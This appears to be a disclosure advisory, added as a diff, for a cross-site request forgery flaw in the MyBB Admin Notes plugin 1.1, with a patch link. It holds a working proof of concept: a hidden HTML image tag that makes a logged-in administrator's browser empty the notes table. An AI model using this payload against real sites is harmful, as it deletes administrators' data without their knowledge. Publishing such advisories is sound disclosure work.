@@ -1,0 +1,20 @@
+# Exploit Title: MyBB Admin Notes Plugin - CSRF
+# Date: 2018-05-14
+# Author: 0xB9
+# Contact: luxorforums.com/User-0xB9 or 0xB9[at]pm.me
+# Software Link: https://community.mybb.com/mods.php?action=view&pid=1106
+# Version: 1.1
+# Tested on: Ubuntu 18.04
+
+# 1. Description: The plugin allows administrators to save notes and display them in a list in the ACP. The CSRF allows an attacker to remotely delete all admin notes.
+
+# 2. Proof of Concept:
+<html>
+	<body>
+		<img style="display:none" src="http://localhost/mybb/admin/index.php?empty=table" alt="">
+	</body>
+</html>
+
+# 3. Solution:
+# Update to the latest release
+# Patch: https://github.com/vintagedaddyo/MyBB_Plugin-adminnotes/commit/3deae701cdd89753cb6688302aee5b93a72bc58b?diff=split
